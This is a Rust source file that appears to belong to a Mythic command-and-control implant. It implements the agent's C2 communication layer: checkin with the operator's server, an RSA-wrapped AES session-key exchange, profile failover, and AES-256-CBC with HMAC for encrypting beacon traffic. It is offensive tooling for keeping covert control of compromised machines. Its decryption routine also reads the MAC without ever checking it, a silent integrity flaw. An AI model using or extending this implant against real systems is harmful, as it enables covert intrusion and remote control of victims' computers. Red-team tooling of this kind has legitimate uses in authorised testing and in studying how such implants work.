use crate::payloadvars;
use rand::Rng;
use std::error::Error;

use aes::Aes256;
use block_modes::{block_padding::Pkcs7, BlockMode, Cbc};
use hmac::{Hmac, Mac, NewMac};
use openssl::rsa;
use serde::Deserialize;
use serde_json::json;
use sha2::Sha256;

// Import the http profile
#[cfg(http)]
mod http;

/// Struct holding the response for a key exchange
#[allow(dead_code)]
#[derive(Debug, Deserialize)]
struct KeyExchangeReponse {
    /// Action field of the Mythic response
    action: String,

    /// New UUID for the key exchange
    uuid: String,

    /// Random session key
    session_key: String,

    /// Key exchange session ID
    session_id: String,
}

/// Struct holding the checkin response
#[derive(Debug, Deserialize)]
pub struct CheckinResponse {
    /// Status of the checkin (success, error)
    pub status: String,

    /// New agent UUID
    pub id: String,

    /// Action field
    pub action: String,
}

/// Trait which C2 profiles implement in order to connect to Mythic
trait C2Profile {
    /// Grabs the profile's AES key
    fn get_aes_key(&self) -> Option<&Vec<u8>>;

    /// Sets the profile's AES key
    fn set_aes_key(&mut self, new_key: Vec<u8>);

    /// Sends data to Mythic
    fn c2send(&mut self, _: &str) -> Result<String, Box<dyn Error>>;
}

/// Struct holding the information about the configured C2 profiles
pub struct Profile {
    /// UUID of the agent
    callback_uuid: String,

    /// Configured profiles
    profiles: Vec<Box<dyn C2Profile>>,

    /// Index of which profile is active
    active: usize,
}

impl Profile {
    /// Generate a new C2 profile for the agent
    /// * `uuid` - Initial configured UUID
    pub fn new(uuid: String) -> Self {
        // Create a list of configured profiles
        let mut profiles: Vec<Box<dyn C2Profile>> = Vec::new();

        // HTTP profile specified
        #[cfg(http)]
        {
            use http::{profilevars, HTTPProfile};

            // Append the HTTP profile information
            profiles.push(Box::new(HTTPProfile::new(&profilevars::cb_host())));
        }

        // Return a new `Profile` object
        Self {
            callback_uuid: uuid,
            profiles,
            active: 0,
        }
    }

    /// Sends data through the configured C2 profile
    /// * `data` - Data to send
    pub fn send_data(&mut self, data: &str) -> Result<String, Box<dyn Error>> {
        // No profiles are available
        if self.profiles.is_empty() {
            return Err("No profiles configured".into());
        }

        // Get the profile chosen for communication
        let profile = &mut self.profiles[self.active];

        // Formulate the post request payload and encrypt it if necessary
        let req_payload: String = match profile.get_aes_key() {
            Some(key) => base64::encode(encrypt_payload(
                data.as_bytes(),
                key,
                Some(&self.callback_uuid),
            )),
            None => base64::encode(format!("{}{}", self.callback_uuid, data)),
        };

        // Send the payload through the configured C2 profile
        let body = profile.c2send(&req_payload).unwrap();

        // Decode the response
        let decoded = base64::decode(body)?;

        // Decrypt the payload if needed
        let decrypted_body: Vec<u8> = match profile.get_aes_key() {
            Some(key) => decrypt_payload(&decoded, key, Some(&payloadvars::payload_uuid())),
            None => decoded[36..].to_vec(),
        };

        // Return the decoded and decrypted response
        Ok(std::str::from_utf8(&decrypted_body)?.to_string())
    }

    /// Makes the initial checkin to the C2
    /// * `data` - Data to send for the checkin
    pub fn initial_checkin(&mut self, data: &str) -> Result<(), Box<dyn Error>> {
        // Check if the agent should perform a key exchange
        if payloadvars::encrypted_exchange_check() == "T" {
            self.perform_key_exchange()?;
            let sleep_interval = payloadvars::callback_interval() / 4;
            let sleep_interval =
                crate::agent::calculate_sleep_time(sleep_interval, payloadvars::callback_jitter());
            std::thread::sleep(std::time::Duration::from_secs(sleep_interval));
        }

        // Send the data using the specified C2 profile
        let resp = match self.send_data(data) {
            Ok(r) => r,
            Err(e) => {
                self.active = (self.active + 1) % self.profiles.len();
                return Err(e);
            }
        };

        // Parse the JSON data into a `CheckinResponse` struct
        let checkin_response: CheckinResponse = serde_json::from_str(&resp)?;

        // Set the new agent UUID
        self.callback_uuid = checkin_response.id;

        Ok(())
    }

    /// Performs an EKE with Mythic using the specified C2 profile
    pub fn perform_key_exchange(&mut self) -> Result<(), Box<dyn Error>> {
        // Generate a private/public RSA 4096 key pair
        let rsa_key = rsa::Rsa::generate(4096)?;
        let public_key = rsa_key.public_key_to_pem_pkcs1()?;

        // Generate a random session id
        let mut session_id: [char; 20] = ['a'; 20];
        rand::thread_rng().try_fill(&mut session_id)?;

        // Formulate the body for staging a key exchange
        let body = json!({
            "action": "staging_rsa",
            "pub_key": base64::encode(public_key),
            "session_id": session_id.iter().cloned().collect::<String>(),
        })
        .to_string();

        // Send the initial key exchange data
        let body = match self.send_data(&body) {
            Ok(b) => b,
            Err(e) => {
                if !self.profiles.is_empty() {
                    self.active = (self.active + 1) % self.profiles.len();
                }
                return Err(e);
            }
        };

        // Parse the result
        let body: KeyExchangeReponse = serde_json::from_str(&body)?;

        // Grab the new AES key from the RSA encrypted response
        let mut new_key = vec![0; rsa_key.size() as usize];
        let encrypted_aes_key = base64::decode(&body.session_key)?;

        rsa_key.private_decrypt(&encrypted_aes_key, &mut new_key, rsa::Padding::PKCS1_OAEP)?;
        new_key.truncate(32);

        // Set the new active profile
        let profile = &mut self.profiles[self.active];

        // Set the new AES key
        profile.set_aes_key(new_key);

        // Set the new agent UUID
        self.callback_uuid = body.uuid;

        Ok(())
    }
}

/// Encrypts the payload of the agent
/// * `message` - Message to encrypt
/// * `key` - AES key for encryption
/// * `uuid` - UUID of the agent for the payload
fn encrypt_payload(message: &[u8], key: &[u8], uuid: Option<&String>) -> Vec<u8> {
    let encrypted_data = encrypt_aes256(message, key);
    match uuid {
        Some(id) => {
            let id = id.as_bytes();
            [id, &encrypted_data[..]].concat()
        }
        None => encrypted_data,
    }
}

/// Decrypts the payload for the agent
/// * `message` - Message to decrypt
/// * `key` - AES key for decryption
/// * `uuid` - Agent's UUID
fn decrypt_payload(message: &[u8], key: &[u8], uuid: Option<&String>) -> Vec<u8> {
    match uuid {
        Some(_) => decrypt_aes256(&message[36..], key),
        None => decrypt_aes256(message, key),
    }
}

/// AES encrypts data with HMAC
/// * `data` - Data to encrypt
/// * `key` - Key for encryption
fn encrypt_aes256(data: &[u8], key: &[u8]) -> Vec<u8> {
    // Use SHA 256 for the hmac signing
    type HmacSha256 = Hmac<Sha256>;

    // Create a new hmac object
    let mut h = HmacSha256::new_from_slice(key).unwrap();

    // Generate a random IV
    let iv = rand::random::<[u8; 16]>().to_vec();

    // AES encrypt the data
    type Aes256Cbc = Cbc<Aes256, Pkcs7>;
    let cipher = Aes256Cbc::new_from_slices(key, &iv).unwrap();
    let mut ciphertext = cipher.encrypt_vec(data);

    // Create the encrypted output (iv + message + mac)
    let mut msg = iv;
    msg.append(&mut ciphertext);

    h.update(&msg);
    let mac = h.finalize();
    msg.append(&mut mac.into_bytes().to_vec());

    // Return the encrypted data
    msg
}

/// AES descrypts data
/// * `data` - Data to decrypt
/// * `key` - Key for decryption
fn decrypt_aes256(data: &[u8], key: &[u8]) -> Vec<u8> {
    // Grab the IV
    let iv = &data[..16];

    // Grab the MAC
    let _mac = &data[data.len() - 32..];

    // Grab the encrypted message
    let message = &data[16..data.len() - 32];

    // Decrypt the message
    type Aes256Cbc = Cbc<Aes256, Pkcs7>;
    let cipher = Aes256Cbc::new_from_slices(key, iv).unwrap();

    // Return the decrypted message
    cipher.decrypt_vec(message).unwrap()
}
